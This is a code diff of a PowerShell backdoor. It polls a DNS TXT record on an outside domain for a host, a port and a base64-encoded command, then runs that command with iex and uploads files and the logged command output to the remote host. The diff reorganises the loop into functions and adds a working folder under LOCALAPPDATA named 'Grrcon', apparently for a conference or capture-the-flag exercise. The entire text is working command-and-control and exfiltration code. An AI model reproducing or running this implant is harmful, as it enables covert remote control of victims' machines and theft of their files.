@@ -1,12 +1,21 @@
-$query = Resolve-DnsName -Type TXT -Name post.thomassomerville.com
-$results = $query.strings -split ","
-$address = $results[0]
-$port = $results[1]
-$cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($results[2]))
+$wp = $env:LOCALAPPDATA + "\Grrcon\"
+if (!(Test-Path $wp)) {
+        New-Item -ItemType Directory -Force -Path $wp
+}
 
-While ($True){
+function query(){
+    $query = Resolve-DnsName -Type TXT -Name grrcon.thomassomerville.com
+    $results = $query.strings -split ","
+    $address = $results[0]
+    $port = $results[1]
+    $cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($results[2]))
+}
+function runcommand(){
     if ($cmd.StartsWith("EXEC=")){
         $exec = iex($cmd.substring(5))
+        $logpath = $wp + "execlog.txt"
+        $exec | Out-File -FilePath $logpath
+        sendData($logpath)   
     }
     if ($cmd.StartsWith("RUN=")){
         iex($cmd.substring(4))
@@ -17,9 +26,16 @@ While ($True){
     }
     if ($cmd.StartsWith("PUT=")){
         $putCMD = $cmd.substring(4) -split ","
+        sendData($putCMD[0])
+    }
+}
+function sendData($datatosend) {
         $url = "http://"+$address+":"+$port
         $wc = New-Object System.Net.WebClient
-        $wc.UploadFile($url,$putCMD[0])
-    }
+        $wc.UploadFile($url,$datatosend)
+}
+While ($True){
+    query
+    runcommand
     Start-Sleep -s 100
 }
